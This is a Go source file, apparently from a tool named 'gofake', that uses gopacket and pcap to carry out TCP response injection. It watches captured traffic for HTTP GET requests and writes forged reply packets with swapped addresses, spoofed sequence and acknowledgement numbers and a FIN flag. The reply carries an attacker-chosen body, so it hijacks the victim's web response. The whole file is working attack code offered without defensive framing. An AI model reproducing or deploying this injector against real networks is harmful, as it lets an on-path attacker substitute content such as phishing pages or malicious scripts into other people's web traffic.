package main

import (
	"fmt"
	"gofake/common"
	"strings"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// SendHijack 采用gopacket发送伪造包
func SendHijack(handle *pcap.Handle, packet gopacket.Packet) {
	tcpLayer := packet.Layer(layers.LayerTypeTCP)
	pTcp := tcpLayer.(*layers.TCP)

	if pTcp.SYN || pTcp.RST {
		return
	}

	data := string(pTcp.LayerPayload())

	// Get
	if !strings.HasPrefix(data, "GET") {
		return
	}

	ethLayer := packet.Layer(layers.LayerTypeEthernet)
	eth := layers.Ethernet{
		SrcMAC:       ethLayer.(*layers.Ethernet).DstMAC,
		DstMAC:       ethLayer.(*layers.Ethernet).SrcMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}

	ipv4Layer := packet.Layer(layers.LayerTypeIPv4)
	pIp := ipv4Layer.(*layers.IPv4)

	ipv4 := layers.IPv4{
		Version:  pIp.Version,
		SrcIP:    pIp.DstIP,
		DstIP:    pIp.SrcIP,
		TTL:      77,
		Id:       pIp.Id,
		Protocol: layers.IPProtocolTCP,
	}

	tcp := layers.TCP{
		SrcPort: pTcp.DstPort,
		DstPort: pTcp.SrcPort,
		PSH:     true,
		ACK:     true,
		FIN:     true,
		Seq:     pTcp.Ack,
		Ack:     pTcp.Seq + uint32(len(data)),
		Window:  0,
	}

	tcp.SetNetworkLayerForChecksum(&ipv4)

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, &eth, &ipv4, &tcp, gopacket.Payload(common.Body)); err != nil {
		fmt.Println(err)
	}

	if err := handle.WritePacketData(buf.Bytes()); err != nil {
		fmt.Println(err)
	}
}
